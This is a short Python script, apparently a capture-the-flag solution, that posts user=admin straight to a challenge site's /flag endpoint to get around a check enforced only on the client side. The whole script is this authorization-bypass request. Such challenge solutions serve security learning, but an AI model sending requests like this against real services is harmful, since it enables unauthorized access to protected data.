import requests

URL="https://flag-viewer.mc.ax"

# bypass client filtering
res = requests.post(URL + "/flag", data={"user": "admin"})
print(res.text)